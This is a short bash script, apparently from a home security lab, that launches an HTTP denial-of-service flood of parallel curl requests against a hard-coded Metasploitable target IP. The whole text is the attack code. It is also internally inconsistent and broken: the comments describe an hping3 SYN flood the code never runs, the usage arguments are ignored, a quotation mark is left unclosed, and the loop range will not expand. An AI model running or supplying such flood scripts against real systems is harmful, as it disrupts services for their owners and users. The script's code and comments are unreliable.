#

!/bin/bash
vm_lab/attack_scripts/dos_attack.sh
Simulates a DoS flood (hping3 SYN flood) for lab purposes.
Run from Kali Linux > target Metasploitable (VM only! )
#
Usage: ./dos_attack.sh <TARGET_IP> <DURATION_SECONDS>

TARGET="192.168.232.130"

echo "Starting HTTP flood ...

for i in {1 .. 500}; do
    curl -s http://$TARGET > /dev/null &
done

wait
echo "Done"